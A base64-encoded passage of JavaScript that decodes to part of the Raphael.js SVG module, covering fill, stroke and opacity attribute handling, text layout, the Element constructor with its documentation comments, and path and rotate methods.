aW4gby5fLmFycm93cyAmJiBhZGRBcnJvdyhvLCBvLl8uYXJyb3dzLnN0YXJ0U3RyaW5nKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImVuZFN0cmluZ1wiIGluIG8uXy5hcnJvd3MgJiYgYWRkQXJyb3cobywgby5fLmFycm93cy5lbmRTdHJpbmcsIDEpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgIGNhc2UgXCJzdHJva2UtZGFzaGFycmF5XCI6XG4gICAgICAgICAgICAgICAgICAgICAgICBhZGREYXNoZXMobywgdmFsdWUsIHBhcmFtcyk7XG4gICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICAgICAgY2FzZSBcImZpbGxcIjpcbiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBpc1VSTCA9IFN0cih2YWx1ZSkubWF0Y2goUi5fSVNVUkwpO1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGlzVVJMKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZWwgPSAkKFwicGF0dGVyblwiKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgaWcgPSAkKFwiaW1hZ2VcIik7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZWwuaWQgPSBSLmNyZWF0ZVVVSUQoKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkKGVsLCB7eDogMCwgeTogMCwgcGF0dGVyblVuaXRzOiBcInVzZXJTcGFjZU9uVXNlXCIsIGhlaWdodDogMSwgd2lkdGg6IDF9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkKGlnLCB7eDogMCwgeTogMCwgXCJ4bGluazpocmVmXCI6IGlzVVJMWzFdfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZWwuYXBwZW5kQ2hpbGQoaWcpO1xuXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgKGZ1bmN0aW9uIChlbCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSLl9wcmVsb2FkKGlzVVJMWzFdLCBmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgdyA9IHRoaXMub2Zmc2V0V2lkdGgsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaCA9IHRoaXMub2Zmc2V0SGVpZ2h0O1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJChlbCwge3dpZHRoOiB3LCBoZWlnaHQ6IGh9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICQoaWcsIHt3aWR0aDogdywgaGVpZ2h0OiBofSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pKGVsKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvLnBhcGVyLmRlZnMuYXBwZW5kQ2hpbGQoZWwpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICQobm9kZSwge2ZpbGw6IFwidXJsKCNcIiArIGVsLmlkICsgXCIpXCJ9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvLnBhdHRlcm4gPSBlbDtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvLnBhdHRlcm4gJiYgdXBkYXRlUG9zaXRpb24obyk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICB2YXIgY2xyID0gUi5nZXRSR0IodmFsdWUpO1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFjbHIuZXJyb3IpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZWxldGUgcGFyYW1zLmdyYWRpZW50O1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRlbGV0ZSBhdHRycy5ncmFkaWVudDtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAhUi5pcyhhdHRycy5vcGFjaXR5LCBcInVuZGVmaW5lZFwiKSAmJlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSLmlzKHBhcmFtcy5vcGFjaXR5LCBcInVuZGVmaW5lZFwiKSAmJlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkKG5vZGUsIHtvcGFjaXR5OiBhdHRycy5vcGFjaXR5fSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgIVIuaXMoYXR0cnNbXCJmaWxsLW9wYWNpdHlcIl0sIFwidW5kZWZpbmVkXCIpICYmXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFIuaXMocGFyYW1zW1wiZmlsbC1vcGFjaXR5XCJdLCBcInVuZGVmaW5lZFwiKSAmJlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkKG5vZGUsIHtcImZpbGwtb3BhY2l0eVwiOiBhdHRyc1tcImZpbGwtb3BhY2l0eVwiXX0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoby50eXBlID09IFwiY2lyY2xlXCIgfHwgby50eXBlID09IFwiZWxsaXBzZVwiIHx8IFN0cih2YWx1ZSkuY2hhckF0KCkgIT0gXCJyXCIpICYmIGFkZEdyYWRpZW50RmlsbChvLCB2YWx1ZSkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoXCJvcGFjaXR5XCIgaW4gYXR0cnMgfHwgXCJmaWxsLW9wYWNpdHlcIiBpbiBhdHRycykge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgZ3JhZGllbnQgPSBSLl9nLmRvYy5nZXRFbGVtZW50QnlJZChub2RlLmdldEF0dHJpYnV0ZShcImZpbGxcIikucmVwbGFjZSgvXnVybFxcKCN8XFwpJC9nLCBFKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChncmFkaWVudCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHN0b3BzID0gZ3JhZGllbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoXCJzdG9wXCIpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJChzdG9wc1tzdG9wcy5sZW5ndGggLSAxXSwge1wic3RvcC1vcGFjaXR5XCI6IChcIm9wYWNpdHlcIiBpbiBhdHRycyA/IGF0dHJzLm9wYWNpdHkgOiAxKSAqIChcImZpbGwtb3BhY2l0eVwiIGluIGF0dHJzID8gYXR0cnNbXCJmaWxsLW9wYWNpdHlcIl0gOiAxKX0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF0dHJzLmdyYWRpZW50ID0gdmFsdWU7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYXR0cnMuZmlsbCA9IFwibm9uZVwiO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgY2xyW2hhc10oXCJvcGFjaXR5XCIpICYmICQobm9kZSwge1wiZmlsbC1vcGFjaXR5XCI6IGNsci5vcGFjaXR5ID4gMSA/IGNsci5vcGFjaXR5IC8gMTAwIDogY2xyLm9wYWNpdHl9KTtcbiAgICAgICAgICAgICAgICAgICAgY2FzZSBcInN0cm9rZVwiOlxuICAgICAgICAgICAgICAgICAgICAgICAgY2xyID0gUi5nZXRSR0IodmFsdWUpO1xuICAgICAgICAgICAgICAgICAgICAgICAgbm9kZS5zZXRBdHRyaWJ1dGUoYXR0LCBjbHIuaGV4KTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGF0dCA9PSBcInN0cm9rZVwiICYmIGNscltoYXNdKFwib3BhY2l0eVwiKSAmJiAkKG5vZGUsIHtcInN0cm9rZS1vcGFjaXR5XCI6IGNsci5vcGFjaXR5ID4gMSA/IGNsci5vcGFjaXR5IC8gMTAwIDogY2xyLm9wYWNpdHl9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhdHQgPT0gXCJzdHJva2VcIiAmJiBvLl8uYXJyb3dzKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJzdGFydFN0cmluZ1wiIGluIG8uXy5hcnJvd3MgJiYgYWRkQXJyb3cobywgby5fLmFycm93cy5zdGFydFN0cmluZyk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJlbmRTdHJpbmdcIiBpbiBvLl8uYXJyb3dzICYmIGFkZEFycm93KG8sIG8uXy5hcnJvd3MuZW5kU3RyaW5nLCAxKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICBjYXNlIFwiZ3JhZGllbnRcIjpcbiAgICAgICAgICAgICAgICAgICAgICAgIChvLnR5cGUgPT0gXCJjaXJjbGVcIiB8fCBvLnR5cGUgPT0gXCJlbGxpcHNlXCIgfHwgU3RyKHZhbHVlKS5jaGFyQXQoKSAhPSBcInJcIikgJiYgYWRkR3JhZGllbnRGaWxsKG8sIHZhbHVlKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICBjYXNlIFwib3BhY2l0eVwiOlxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGF0dHJzLmdyYWRpZW50ICYmICFhdHRyc1toYXNdKFwic3Ryb2tlLW9wYWNpdHlcIikpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkKG5vZGUsIHtcInN0cm9rZS1vcGFjaXR5XCI6IHZhbHVlID4gMSA/IHZhbHVlIC8gMTAwIDogdmFsdWV9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgIC8vIGZhbGxcbiAgICAgICAgICAgICAgICAgICAgY2FzZSBcImZpbGwtb3BhY2l0eVwiOlxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGF0dHJzLmdyYWRpZW50KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZ3JhZGllbnQgPSBSLl9nLmRvYy5nZXRFbGVtZW50QnlJZChub2RlLmdldEF0dHJpYnV0ZShcImZpbGxcIikucmVwbGFjZSgvXnVybFxcKCN8XFwpJC9nLCBFKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGdyYWRpZW50KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0b3BzID0gZ3JhZGllbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoXCJzdG9wXCIpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkKHN0b3BzW3N0b3BzLmxlbmd0aCAtIDFdLCB7XCJzdG9wLW9wYWNpdHlcIjogdmFsdWV9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGRlZmF1bHQ6XG4gICAgICAgICAgICAgICAgICAgICAgICBhdHQgPT0gXCJmb250LXNpemVcIiAmJiAodmFsdWUgPSB0b0ludCh2YWx1ZSwgMTApICsgXCJweFwiKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBjc3NydWxlID0gYXR0LnJlcGxhY2UoLyhcXC0uKS9nLCBmdW5jdGlvbiAodykge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB3LnN1YnN0cmluZygxKS50b1VwcGVyQ2FzZSgpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICBub2RlLnN0eWxlW2Nzc3J1bGVdID0gdmFsdWU7XG4gICAgICAgICAgICAgICAgICAgICAgICBvLl8uZGlydHkgPSAxO1xuICAgICAgICAgICAgICAgICAgICAgICAgbm9kZS5zZXRBdHRyaWJ1dGUoYXR0LCB2YWx1ZSk7XG4gICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cblxuICAgICAgICB0dW5lVGV4dChvLCBwYXJhbXMpO1xuICAgICAgICBub2RlLnN0eWxlLnZpc2liaWxpdHkgPSB2aXM7XG4gICAgfSxcbiAgICBsZWFkaW5nID0gMS4yLFxuICAgIHR1bmVUZXh0ID0gZnVuY3Rpb24gKGVsLCBwYXJhbXMpIHtcbiAgICAgICAgaWYgKGVsLnR5cGUgIT0gXCJ0ZXh0XCIgfHwgIShwYXJhbXNbaGFzXShcInRleHRcIikgfHwgcGFyYW1zW2hhc10oXCJmb250XCIpIHx8IHBhcmFtc1toYXNdKFwiZm9udC1zaXplXCIpIHx8IHBhcmFtc1toYXNdKFwieFwiKSB8fCBwYXJhbXNbaGFzXShcInlcIikpKSB7XG4gICAgICAgICAgICByZXR1cm47XG4gICAgICAgIH1cbiAgICAgICAgdmFyIGEgPSBlbC5hdHRycyxcbiAgICAgICAgICAgIG5vZGUgPSBlbC5ub2RlLFxuICAgICAgICAgICAgZm9udFNpemUgPSBub2RlLmZpcnN0Q2hpbGQgPyB0b0ludChSLl9nLmRvYy5kZWZhdWx0Vmlldy5nZXRDb21wdXRlZFN0eWxlKG5vZGUuZmlyc3RDaGlsZCwgRSkuZ2V0UHJvcGVydHlWYWx1ZShcImZvbnQtc2l6ZVwiKSwgMTApIDogMTA7XG5cbiAgICAgICAgaWYgKHBhcmFtc1toYXNdKFwidGV4dFwiKSkge1xuICAgICAgICAgICAgYS50ZXh0ID0gcGFyYW1zLnRleHQ7XG4gICAgICAgICAgICB3aGlsZSAobm9kZS5maXJzdENoaWxkKSB7XG4gICAgICAgICAgICAgICAgbm9kZS5yZW1vdmVDaGlsZChub2RlLmZpcnN0Q2hpbGQpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgdmFyIHRleHRzID0gU3RyKHBhcmFtcy50ZXh0KS5zcGxpdChcIlxcblwiKSxcbiAgICAgICAgICAgICAgICB0c3BhbnMgPSBbXSxcbiAgICAgICAgICAgICAgICB0c3BhbjtcbiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwLCBpaSA9IHRleHRzLmxlbmd0aDsgaSA8IGlpOyBpKyspIHtcbiAgICAgICAgICAgICAgICB0c3BhbiA9ICQoXCJ0c3BhblwiKTtcbiAgICAgICAgICAgICAgICBpICYmICQodHNwYW4sIHtkeTogZm9udFNpemUgKiBsZWFkaW5nLCB4OiBhLnh9KTtcbiAgICAgICAgICAgICAgICB0c3Bhbi5hcHBlbmRDaGlsZChSLl9nLmRvYy5jcmVhdGVUZXh0Tm9kZSh0ZXh0c1tpXSkpO1xuICAgICAgICAgICAgICAgIG5vZGUuYXBwZW5kQ2hpbGQodHNwYW4pO1xuICAgICAgICAgICAgICAgIHRzcGFuc1tpXSA9IHRzcGFuO1xuICAgICAgICAgICAgfVxuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgdHNwYW5zID0gbm9kZS5nZXRFbGVtZW50c0J5VGFnTmFtZShcInRzcGFuXCIpO1xuICAgICAgICAgICAgZm9yIChpID0gMCwgaWkgPSB0c3BhbnMubGVuZ3RoOyBpIDwgaWk7IGkrKykgaWYgKGkpIHtcbiAgICAgICAgICAgICAgICAkKHRzcGFuc1tpXSwge2R5OiBmb250U2l6ZSAqIGxlYWRpbmcsIHg6IGEueH0pO1xuICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAkKHRzcGFuc1swXSwge2R5OiAwfSk7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICAgICAgJChub2RlLCB7eDogYS54LCB5OiBhLnl9KTtcbiAgICAgICAgZWwuXy5kaXJ0eSA9IDE7XG4gICAgICAgIHZhciBiYiA9IGVsLl9nZXRCQm94KCksXG4gICAgICAgICAgICBkaWYgPSBhLnkgLSAoYmIueSArIGJiLmhlaWdodCAvIDIpO1xuICAgICAgICBkaWYgJiYgUi5pcyhkaWYsIFwiZmluaXRlXCIpICYmICQodHNwYW5zWzBdLCB7ZHk6IGRpZn0pO1xuICAgIH0sXG4gICAgZ2V0UmVhbE5vZGUgPSBmdW5jdGlvbiAobm9kZSkge1xuICAgICAgICBpZiAobm9kZS5wYXJlbnROb2RlICYmIG5vZGUucGFyZW50Tm9kZS50YWdOYW1lLnRvTG93ZXJDYXNlKCkgPT09IFwiYVwiKSB7XG4gICAgICAgICAgICByZXR1cm4gbm9kZS5wYXJlbnROb2RlO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgcmV0dXJuIG5vZGU7XG4gICAgICAgIH1cbiAgICB9LFxuICAgIEVsZW1lbnQgPSBmdW5jdGlvbiAobm9kZSwgc3ZnKSB7XG4gICAgICAgIHZhciBYID0gMCxcbiAgICAgICAgICAgIFkgPSAwO1xuICAgICAgICAvKlxcXG4gICAgICAgICAqIEVsZW1lbnQubm9kZVxuICAgICAgICAgWyBwcm9wZXJ0eSAob2JqZWN0KSBdXG4gICAgICAgICAqKlxuICAgICAgICAgKiBHaXZlcyB5b3UgYSByZWZlcmVuY2UgdG8gdGhlIERPTSBvYmplY3QsIHNvIHlvdSBjYW4gYXNzaWduIGV2ZW50IGhhbmRsZXJzIG9yIGp1c3QgbWVzcyBhcm91bmQuXG4gICAgICAgICAqKlxuICAgICAgICAgKiBOb3RlOiBEb27igJl0IG1lc3Mgd2l0aCBpdC5cbiAgICAgICAgID4gVXNhZ2VcbiAgICAgICAgIHwgLy8gZHJhdyBhIGNpcmNsZSBhdCBjb29yZGluYXRlIDEwLDEwIHdpdGggcmFkaXVzIG9mIDEwXG4gICAgICAgICB8IHZhciBjID0gcGFwZXIuY2lyY2xlKDEwLCAxMCwgMTApO1xuICAgICAgICAgfCBjLm5vZGUub25jbGljayA9IGZ1bmN0aW9uICgpIHtcbiAgICAgICAgIHwgICAgIGMuYXR0cihcImZpbGxcIiwgXCJyZWRcIik7XG4gICAgICAgICB8IH07XG4gICAgICAgIFxcKi9cbiAgICAgICAgdGhpc1swXSA9IHRoaXMubm9kZSA9IG5vZGU7XG4gICAgICAgIC8qXFxcbiAgICAgICAgICogRWxlbWVudC5yYXBoYWVsXG4gICAgICAgICBbIHByb3BlcnR5IChvYmplY3QpIF1cbiAgICAgICAgICoqXG4gICAgICAgICAqIEludGVybmFsIHJlZmVyZW5jZSB0byBAUmFwaGFlbCBvYmplY3QuIEluIGNhc2UgaXQgaXMgbm90IGF2YWlsYWJsZS5cbiAgICAgICAgID4gVXNhZ2VcbiAgICAgICAgIHwgUmFwaGFlbC5lbC5yZWQgPSBmdW5jdGlvbiAoKSB7XG4gICAgICAgICB8ICAgICB2YXIgaHNiID0gdGhpcy5wYXBlci5yYXBoYWVsLnJnYjJoc2IodGhpcy5hdHRyKFwiZmlsbFwiKSk7XG4gICAgICAgICB8ICAgICBoc2IuaCA9IDE7XG4gICAgICAgICB8ICAgICB0aGlzLmF0dHIoe2ZpbGw6IHRoaXMucGFwZXIucmFwaGFlbC5oc2IycmdiKGhzYikuaGV4fSk7XG4gICAgICAgICB8IH1cbiAgICAgICAgXFwqL1xuICAgICAgICBub2RlLnJhcGhhZWwgPSB0cnVlO1xuICAgICAgICAvKlxcXG4gICAgICAgICAqIEVsZW1lbnQuaWRcbiAgICAgICAgIFsgcHJvcGVydHkgKG51bWJlcikgXVxuICAgICAgICAgKipcbiAgICAgICAgICogVW5pcXVlIGlkIG9mIHRoZSBlbGVtZW50LiBFc3BlY2lhbGx5IHVzZWZ1bCB3aGVuIHlvdSB3YW50IHRvIGxpc3RlbiB0byBldmVudHMgb2YgdGhlIGVsZW1lbnQsXG4gICAgICAgICAqIGJlY2F1c2UgYWxsIGV2ZW50cyBhcmUgZmlyZWQgaW4gZm9ybWF0IGA8bW9kdWxlPi48YWN0aW9uPi48aWQ+YC4gQWxzbyB1c2VmdWwgZm9yIEBQYXBlci5nZXRCeUlkIG1ldGhvZC5cbiAgICAgICAgXFwqL1xuICAgICAgICB0aGlzLmlkID0gZ3VpZCgpO1xuICAgICAgICBub2RlLnJhcGhhZWxpZCA9IHRoaXMuaWQ7XG5cbiAgICAgICAgLyoqXG4gICAgICAgICogTWV0aG9kIHRoYXQgcmV0dXJucyBhIDUgbGV0dGVyL2RpZ2l0IGlkLCBlbm91Z2ggZm9yIDM2XjUgPSA2MDQ2NjE3NiBlbGVtZW50c1xuICAgICAgICAqIEByZXR1cm5zIHtzdHJpbmd9IGlkXG4gICAgICAgICovXG4gICAgICAgIGZ1bmN0aW9uIGd1aWQoKSB7XG4gICAgICAgICAgICByZXR1cm4gKFwiMDAwMFwiICsgKE1hdGgucmFuZG9tKCkqTWF0aC5wb3coMzYsNSkgPDwgMCkudG9TdHJpbmcoMzYpKS5zbGljZSgtNSk7XG4gICAgICAgIH1cblxuICAgICAgICB0aGlzLm1hdHJpeCA9IFIubWF0cml4KCk7XG4gICAgICAgIHRoaXMucmVhbFBhdGggPSBudWxsO1xuICAgICAgICAvKlxcXG4gICAgICAgICAqIEVsZW1lbnQucGFwZXJcbiAgICAgICAgIFsgcHJvcGVydHkgKG9iamVjdCkgXVxuICAgICAgICAgKipcbiAgICAgICAgICogSW50ZXJuYWwgcmVmZXJlbmNlIHRvIOKAnHBhcGVy4oCdIHdoZXJlIG9iamVjdCBkcmF3bi4gTWFpbmx5IGZvciB1c2UgaW4gcGx1Z2lucyBhbmQgZWxlbWVudCBleHRlbnNpb25zLlxuICAgICAgICAgPiBVc2FnZVxuICAgICAgICAgfCBSYXBoYWVsLmVsLmNyb3NzID0gZnVuY3Rpb24gKCkge1xuICAgICAgICAgfCAgICAgdGhpcy5hdHRyKHtmaWxsOiBcInJlZFwifSk7XG4gICAgICAgICB8ICAgICB0aGlzLnBhcGVyLnBhdGgoXCJNMTAsMTBMNTAsNTBNNTAsMTBMMTAsNTBcIilcbiAgICAgICAgIHwgICAgICAgICAuYXR0cih7c3Ryb2tlOiBcInJlZFwifSk7XG4gICAgICAgICB8IH1cbiAgICAgICAgXFwqL1xuICAgICAgICB0aGlzLnBhcGVyID0gc3ZnO1xuICAgICAgICB0aGlzLmF0dHJzID0gdGhpcy5hdHRycyB8fCB7fTtcbiAgICAgICAgdGhpcy5fID0ge1xuICAgICAgICAgICAgdHJhbnNmb3JtOiBbXSxcbiAgICAgICAgICAgIHN4OiAxLFxuICAgICAgICAgICAgc3k6IDEsXG4gICAgICAgICAgICBkZWc6IDAsXG4gICAgICAgICAgICBkeDogMCxcbiAgICAgICAgICAgIGR5OiAwLFxuICAgICAgICAgICAgZGlydHk6IDFcbiAgICAgICAgfTtcbiAgICAgICAgIXN2Zy5ib3R0b20gJiYgKHN2Zy5ib3R0b20gPSB0aGlzKTtcbiAgICAgICAgLypcXFxuICAgICAgICAgKiBFbGVtZW50LnByZXZcbiAgICAgICAgIFsgcHJvcGVydHkgKG9iamVjdCkgXVxuICAgICAgICAgKipcbiAgICAgICAgICogUmVmZXJlbmNlIHRvIHRoZSBwcmV2aW91cyBlbGVtZW50IGluIHRoZSBoaWVyYXJjaHkuXG4gICAgICAgIFxcKi9cbiAgICAgICAgdGhpcy5wcmV2ID0gc3ZnLnRvcDtcbiAgICAgICAgc3ZnLnRvcCAmJiAoc3ZnLnRvcC5uZXh0ID0gdGhpcyk7XG4gICAgICAgIHN2Zy50b3AgPSB0aGlzO1xuICAgICAgICAvKlxcXG4gICAgICAgICAqIEVsZW1lbnQubmV4dFxuICAgICAgICAgWyBwcm9wZXJ0eSAob2JqZWN0KSBdXG4gICAgICAgICAqKlxuICAgICAgICAgKiBSZWZlcmVuY2UgdG8gdGhlIG5leHQgZWxlbWVudCBpbiB0aGUgaGllcmFyY2h5LlxuICAgICAgICBcXCovXG4gICAgICAgIHRoaXMubmV4dCA9IG51bGw7XG4gICAgfSxcbiAgICBlbHByb3RvID0gUi5lbDtcblxuICAgIEVsZW1lbnQucHJvdG90eXBlID0gZWxwcm90bztcbiAgICBlbHByb3RvLmNvbnN0cnVjdG9yID0gRWxlbWVudDtcblxuICAgIFIuX2VuZ2luZS5wYXRoID0gZnVuY3Rpb24gKHBhdGhTdHJpbmcsIFNWRykge1xuICAgICAgICB2YXIgZWwgPSAkKFwicGF0aFwiKTtcbiAgICAgICAgU1ZHLmNhbnZhcyAmJiBTVkcuY2FudmFzLmFwcGVuZENoaWxkKGVsKTtcbiAgICAgICAgdmFyIHAgPSBuZXcgRWxlbWVudChlbCwgU1ZHKTtcbiAgICAgICAgcC50eXBlID0gXCJwYXRoXCI7XG4gICAgICAgIHNldEZpbGxBbmRTdHJva2UocCwge1xuICAgICAgICAgICAgZmlsbDogXCJub25lXCIsXG4gICAgICAgICAgICBzdHJva2U6IFwiIzAwMFwiLFxuICAgICAgICAgICAgcGF0aDogcGF0aFN0cmluZ1xuICAgICAgICB9KTtcbiAgICAgICAgcmV0dXJuIHA7XG4gICAgfTtcbiAgICAvKlxcXG4gICAgICogRWxlbWVudC5yb3RhdGVcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIERlcHJlY2F0ZWQhIFVzZSBARWxlbWVudC50cmFuc2Zvcm0gaW5zdGVhZC5cbiAgICAgKiBBZGRzIHJvdGF0aW9uIGJ5IGdpdmVuIGFuZ2xlIGFyb3VuZCBnaXZlbiBwb2ludCB0byB0aGUgbGlzdCBvZlxuICAgICAqIHRyYW5zZm9ybWF0aW9ucyBvZiB0aGUgZWxlbWVudC5cbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgIC0gZGVnIChudW1iZXIpIGFuZ2xlIGluIGRlZ3JlZXNcbiAgICAgLSBjeCAobnVtYmVyKSAjb3B0aW9uYWwgeCBjb29yZGluYXRlIG9mIHRoZSBjZW50cmUgb2Ygcm90YXRpb25cbiAgICAgLSBjeSAobnVtYmVyKSAjb3B0aW9uYWwgeSBjb29yZGluYXRlIG9mIHRoZSBjZW50cmUgb2Ygcm90YXRpb25cbiAgICAgKiBJZiBjeCAmIGN5IGFyZW7igJl0IHNwZWNpZmllZCBjZW50cmUgb2YgdGhlIHNoYXBlIGlzIHVzZWQgYXMgYSBwb2ludCBvZiByb3RhdGlvbi5cbiAgICAgPSAob2JqZWN0KSBARWxlbWVudFxuICAgIFxcKi9cbiAgICBlbHByb3RvLnJvdGF0ZSA9IGZ1bmN0aW9uIChkZWcsIGN4LCBjeSkge1xuICAgICAgICBpZiAodGhpcy5yZW1vdmVkKSB7XG4gICAgICAgICAgICByZXR1cm4gdGhpcztcbiAgICAgICAgfVxuICAgICAgICBkZWcgPSBTdHIoZGVnKS5zcGxpdChzZXBhcmF0b3IpO1xuICAgICAgICBpZiAoZGVnLmxlbmd0aCAtIDEpIHtcbiAgICAgICAgICAgIGN4ID0gdG9GbG9hdChkZWdbMV0pO1xuICAgICAgICAgICAgY3kgPSB0b0Zsb2F0KGRlZ1syXSk7XG4gICAgICAgIH1cbiAgICAgICAgZGVnID0gdG9GbG9hdChkZWdbMF0pO1xuICAgICAgICAoY3kgPT0gbnVsbCkgJiYgKGN4ID0gY3kpO1xuICAgICAgICBpZiAoY3ggPT0gbnVsbCB8fCBjeSA9PSBudWxsKSB7XG4gICAgICAgICAgICB2YXIgYmJveCA9IHRoaXMuZ2V0QkJveCgxKTtcbiAgICAgICAgICAgIGN4ID0gYmJveC54ICsgYmJveC53aWR0aCAvIDI7XG4gICAgICAgICAgICBjeSA9IGJib3gueSArIGJib3guaGVpZ2h0IC8gMjtcbiAgICAgICAgfVxuICAgICAgICB0aGlzLnRyYW5zZm9ybSh0aGlzLl8udHJhbnNmb3JtLmNvbmNhdChbW1wiclwiLCBkZWcsIGN4LCBjeV1dKSk7XG4gICAgICAgIHJldHVybiB0aGlzO1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIEVsZW1lbnQuc2NhbGVcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIERlcHJlY2F0ZWQhIFVzZSBARWxlbWVudC50cmFuc2Zvcm0gaW5zdGVhZC5cbiAgICAgKiBBZGRzIHNjYWxlIGJ5IGdpdmVuIGFtb3VudCByZWxhdGl2ZSB0byBnaXZlbiBwb2ludCB0byB0aGUgbGlzdCBvZlxuICAgICAqIHRyYW5zZm9ybWF0aW9ucyBvZiB0aGUgZWxlbWVudC5cbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgIC0gc3ggKG51bWJlcikgaG9yaXNvbnRhbCBzY2FsZSBhbW91bnRcbiAgICAgLSBzeSAobnVtYmVyKSB2ZXJ0aWNhbCBzY2FsZSBhbW91bnRcbiAgICAgLSBjeCAobnVtYmVyKSAjb3B0aW9uYWwgeCBjb29yZGluYXRlIG9mIHRoZSBjZW50cmUgb2Ygc2NhbGVcbiAgICAgLSBjeSAobnVtYmVyKSAjb3B0aW9uYWwgeSBjb29yZGluYXRlIG9mIHRoZSBjZW50cmUgb2Ygc2NhbGVcbiAgICAgKiBJZiBjeCAmIGN5IGFyZW7igJl0IHNwZWNpZmllZCBjZW50cmUgb2YgdGhlIHNoYXBlIGlzIHVzZWQgaW5zdGVhZC5cbiAgICAgPSAob2JqZWN0KSBARWxlbWVudFxuICAgIFxcKi9cbiAgICBlbHByb3RvLnNjYWxlID0gZnVuY